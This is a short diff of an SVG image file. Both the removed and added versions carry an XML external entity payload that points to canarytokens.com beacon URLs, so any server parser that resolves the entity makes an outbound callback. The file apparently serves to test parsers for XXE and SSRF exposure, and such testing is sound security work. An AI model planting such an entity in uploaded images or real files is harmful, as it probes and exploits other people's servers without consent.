@@ -1,5 +1,10 @@
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://dj3kv5kg8988sh7iuhmfv0tm2.canarytokens.com"> ]>
-<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
-   <text font-size="16" x="0" y="16">&dtd;</text>
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN"
+  "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd" [
+  <!-- an internal subset can be embedded here -->
+  <!ENTITY xxe SYSTEM "http://canarytokens.com/terms/traffic/y79w4mlxlxxerg3jxuv85cr9g/submit.aspx">
+]>
+<svg width="100%" height="100%" viewBox="0 0 100 100"
+     xmlns="http://www.w3.org/2000/svg">
+  <text x="20" y="35">My &xxe;</text>
 </svg>
